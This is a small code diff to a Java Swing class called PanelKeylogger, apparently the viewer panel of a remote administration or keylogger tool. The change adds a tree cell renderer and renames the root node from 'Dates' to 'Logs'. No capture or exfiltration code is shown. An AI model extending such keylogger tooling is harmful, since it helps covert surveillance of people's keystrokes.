@@ -120,6 +120,7 @@ public class PanelKeylogger extends BaseControlPanel {
 		StyleConstants.setForeground(date, Color.blue);
 
 		tree = new JTree();
+		tree.setCellRenderer(new TreeRenderer());
 		tree.addTreeSelectionListener(new TreeSelectionListener() {
 			public void valueChanged(TreeSelectionEvent event) {
 				Object node = event.getPath().getLastPathComponent();
@@ -145,7 +146,7 @@ public class PanelKeylogger extends BaseControlPanel {
 			}
 		});
 		tree.setShowsRootHandles(true);
-		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Dates")));
+		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Logs")));
 		scrollPane_1.setViewportView(tree);
 		setLayout(groupLayout);
 
